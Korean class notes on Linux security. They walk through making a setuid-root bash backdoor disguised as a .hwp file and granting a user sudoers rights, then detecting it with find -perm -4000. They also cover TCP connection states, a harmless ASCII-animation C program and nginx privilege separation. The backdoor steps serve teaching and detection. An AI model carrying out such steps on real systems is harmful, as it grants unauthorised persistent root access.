백도어 만들고 탐지해보기

백도어 만들기

상황: 관리자가 자리를 비운 사이에 tetris-server는 관리자의 쉘을 훔쳐서 백도어를 만들고자 한다. 백도어는 제한된 기능이 많아서, sudoers에도 등록을 하려고 한다.

  • 관리자 계정 
    cp /usr/bin/bash ./door.hwp
chown root:root ~usr1/door.hwp
chmod u+s ~usr1/door.hwp
  • usr1 계정
    • ~usr1/backdoor.hwp -p
      • -p: 명시적으로 관리자 권한이 필요할 때 사용 (원래는 항상 권한에 대해 보수적으로 동작)
    • id
  • /etc/sudoers 수정
    • root → ALL=(ALL:ALL) ALL 아래에 usr1 → ALL=(ALL:ALL) ALL 추가
    • sudo su -
      • 관리자 권한 사용이 가능한 것을 확인 가능

root ALL=(ALL:ALL) ALL 필드

[사용자/그룹] [호스트] = ([실행 사용자] : [실행 그룹]) [명령어]

⇒ 특정 명령어에 대한 권한만 부여하고 싶다면 마지막 ALL 부분에 ls, cat 등 명령어를 작성하면 된다.

백도어 탐지

상황: 관리자는 주기적으로 set-uid 비트가 할당된 프로그램이 있는지 점검한다.

find / -type f -perm -4000
  • SetUID(4000)가 설정된 파일을 찾음
  • 해커가 일반 사용자 계정으로 접속한 뒤, 이 비트가 설정된 변조 쉘을 실행하여 즉시 root 권한을 탈취하는 기법 방어 (백도어 탐지)

    ⇒ #!/usr/bin/bash

    • #![경로명]: 명령어를 해석할 프로그램의 위치

      • 해당 스크립트를 해석하고 실행할 프로그램(인터프리터)의 경로를 지정

네트워크 연결 상태: LISTEN과 ESTABLISHED

  • LISTEN: 서버 측에서 연결 요청을 기다리고 있는 상태. 특정 포트에서 들어오는 클라이언트의 연결 요청을 대기.
  • ESTABLISHED: TCP 연결이 성공적으로 수립되어 데이터 전송이 가능한 상태. 연결이 활성화되어 있고, 실제 데이터 교환이 이루어지고 있는 상태.

      #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define LPS 14 // Lines per frame

int main() {
    const char *file_path = "starwars.txt";
    FILE *fp = fopen(file_path, "r");

    if (fp == NULL) {
        fprintf(stderr, "File %s does not exist.\n", file_path);
        fprintf(stderr, "파일이 실행 파일과 같은 디렉토리에 있는지 확인하세요.\n");
        return 1;
    }

    char line[256];
    char frame_buffer[LPS][256];

    // 초기 화면 확보를 위한 개행
    for (int i = 0; i < LPS; i++) printf("\n");

    while (fgets(line, sizeof(line), fp)) {
        // 첫 번째 줄은 딜레이 값 (정수)
        int delay_multiplier = atoi(line);

        // 다음 13줄(LPS-1)을 읽어서 프레임 구성
        for (int i = 0; i < LPS - 1; i++) {
            if (fgets(frame_buffer[i], sizeof(frame_buffer[i]), fp)) {
                // 개행 문자 제거 (파이썬의 join 효과)
                frame_buffer[i][strcspn(frame_buffer[i], "\n")] = 0;
            } else {
                frame_buffer[i][0] = '\0';
            }
        }

        // 터미널 제어: LPS만큼 위로 이동 후 내용 삭제(\x1b[14A\x1b[J)
        printf("\x1b[%dA\x1b[J", LPS);
        for (int i = 0; i < LPS - 1; i++) {
            printf("%s\n", frame_buffer[i]);
        }

        // 파이썬의 sleep(int(podaci[i]) * 67 / 1000) 계산
        // usleep은 마이크로초(1/1,000,000초) 단위임
        // 67/1000초는 67,000마이크로초
        usleep(delay_multiplier * 67000);
    }

    fclose(fp);
    return 0;
}

nginx 구동 원리

  • nginx 프로세스를 여러 개로 나눔
    • 이전에는 전부 root 권한으로 구동 → nginx를 통해 루트 계정에 해킹하는 경우가 많았음 ⇒ 방지하고자 여러 개로 나눠서 하나만 root 권한
    • 나머지 프로세스는 www-data가 구동
  • /etc/nginx/nginx/conf
    • 유저 정보
      • user와 프로세스 개수를 정할 수 있음
      • 프로세스 개수는 많을수록 좋지만 컴퓨터 성능에 따라 너무 많아지면 오히려 성능이 떨어진다
    • 수동 설치한 nginx의 conf 파일
      • 유저가 설정되어 있지 않음
      • user solcho로 수정
    • 서버 위치
      • 기본값은 root html
      • 안전하게 가고 싶으면 절대주소로 수정 → 수정하지 않으면 로딩 안 됨
  • 서버 재구동 
    pkill -9 nginx
# 또는
sbin/nginx -s stop

./nginx -c /home/solcho/nginx/conf/nginx.conf
